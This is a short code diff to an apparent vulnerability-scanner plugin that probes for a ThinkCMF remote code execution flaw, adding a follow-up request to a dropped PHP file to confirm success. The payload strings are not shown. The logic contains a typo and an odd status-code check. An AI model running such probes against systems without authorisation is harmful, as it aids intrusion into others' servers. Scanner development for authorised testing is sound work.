@@ -14,11 +14,13 @@ def poc(arg, **kwargs):
 
     pre_vulnurl = arg + pre_payload
     vulnurl=arg + payload
+    checkurl=arg+'/Nginx_Config.php'
     hh = HackRequests.hackRequests()
     try:
         r = hh.http(pre_vulnurl,headers=headers,timeoout=5)
         rr= hh.http(vulnurl,headers=headers,timeout=5)
-        if r.status_code==408:
+        rrr=hh.http(checkurl,headers=headers,timeout=5)
+        if rrr.status_code == 408:
             result = {
                 "name": "thinkcmf REC",  # 插件名称
                 "content": '''影响版本1.6/2.0/2.1/2.2''',  # 插件返回内容详情，会造成什么后果。
